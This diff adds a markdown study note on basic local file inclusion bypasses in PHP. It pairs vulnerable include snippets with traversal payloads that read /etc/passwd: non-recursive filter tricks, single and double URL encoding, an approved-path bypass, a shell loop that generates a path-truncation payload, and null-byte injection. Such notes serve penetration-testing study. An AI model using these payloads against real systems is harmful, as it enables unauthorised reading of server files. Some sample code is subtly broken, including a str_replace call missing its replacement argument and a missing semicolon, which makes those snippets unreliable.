@@ -1,0 +1,145 @@
+---
+Primary_category: "[[LFI]]"
+title: "LFI - BASIC BYPASSES"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[LFI]]
+
+#### *Non-Recursive Path Traversal Filters*
+
+##### *Code*
+
+```php
+<?php
+...<SNIP>...
+if (isset($_GET['language']))
+{
+	include_once(str_replace('../', $_GET['language']));	
+} else
+{
+	die("No HTTP Parameters specified");
+}
+...<SNIP>...
+```
+
+##### *Payload*
+
+```bash
+?language=....//....//....//etc/passwd # ....//
+?language=..././..././..././etc/passwd # ..././
+?language=....\/....\/....\/etc/passwd # ....\/
+?language=....////....////....////etc/passwd # ....////
+```
+
+---
+
+#### *Encoding*
+
+##### *Single Encoding*
+
+```bash
+%2e%2e%2f%2e%2e%2f%2e%2e%2f # ../../../
+```
+
+##### *Double Encoding*
+
+```bash
+%252e%252e%252f%252e%252e%252f%252e%252e%252f # ../../../
+```
+
+---
+
+#### *Approved Path*
+
+##### *Code*
+
+```php
+<?php
+...<SNIP>...
+$lang = $_GET['language']
+
+if (isset($lang) && preg_match('/^\.\/languages\/.+$/', $lang))
+{
+	include_once($lang);
+} else
+{
+	die("No HTTP Parameters specified or Invalid Path");
+}
+...<SNIP>
+```
+
+##### *Payload*
+
+```bash
+?language=./languages/../../../etc/passwd
+```
+
+In this case, the *./languages* directory is the approved path, and any value must have it as its preffix
+
+---
+
+#### *Appended Extensions*
+
+> ***Both techniques only work on PHP versions before 5.5***
+
+##### *Path Truncation*
+
+In earlier versions of *PHP*, due to the limitations of *32-bit* systems, any string had the maximum length of 4096 chars
+
+Therefore, if a *PHP* code appends a *.php* string to the data received via *GET*, an operator could send a payload containing a certain amount of characters until the given string was truncated
+
+###### *Code*
+
+```php
+<?php
+...<SNIP>...
+if (isset($_GET['language']))
+{
+	include_once($_GET['language'] . '.php');
+} else
+{
+	die("No HTTP Parameters specified");
+}
+...<SNIP>...
+```
+
+###### *Payload Generation*
+
+```bash
+echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+```
+
+> [!BUG]- *Payload*
+>
+> ```bash
+> ?language=non_existing_directory/../../../etc/passwd/././././././././././././././././././././././././././. ...<SNIP>...
+> ```
+>
+
+##### *Null Byte Injection*
+
+###### *Code*
+
+```php
+<?php
+...<SNIP>...
+if (isset($_GET['language']))
+{
+	include_once($_GET['language'] . '.php');
+} else
+{
+	die("No HTTP Parameters specified");
+}
+...<SNIP>...
+```
+
+###### *Payload*
+
+```bash
+?language=/etc/passwd%00
+```
